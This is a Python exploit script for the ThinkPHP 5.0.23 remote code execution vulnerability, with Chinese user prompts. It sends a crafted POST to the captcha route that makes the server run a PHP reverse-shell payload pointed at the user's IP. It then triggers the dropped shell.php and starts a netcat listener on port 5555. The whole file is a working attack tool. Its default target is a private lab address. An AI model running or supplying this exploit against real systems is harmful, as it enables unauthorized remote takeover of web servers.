import requests
from shell.php_reverse_tcp import php_reverse
import shell.nc as nc
import threading
headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:67.0) Gecko/20100101 Firefox/67.0"
}
def run(url):
    reverse_ip = input('请输入你本机的IP地址,默认监听5555端口:')
    """Thinkphp 5.0.23 remote code exec"""
    fangwen = url + "/shell.php"
    # print(fangwen)
    payload = php_reverse.payload
    payload = payload % reverse_ip
    data = {
        "_method" : "__construct",
        "filter" : "system",
        "method": "get",
        "server[REQUEST_METHOD]": payload
    }

    try:
        url = url + "/index.php?s=captcha"
        requests.post(url, data=data, headers=headers)
        threading.Thread(target=request, args=(fangwen,)).start()
        print("请在打开浏览器访问"+fangwen)
        nc.run(reverse_ip)
        return "[*]Vulnerable exit....."
    except Exception:
        print("[*]攻击payload失败......")
def request(fangwen):
    print(fangwen)
    try:
        requests.get(fangwen, headers=headers, timeout=5)
    except Exception:
        pass
    return
if __name__ == '__main__':
    run('http://172.16.134.146/cms/TP5/public')
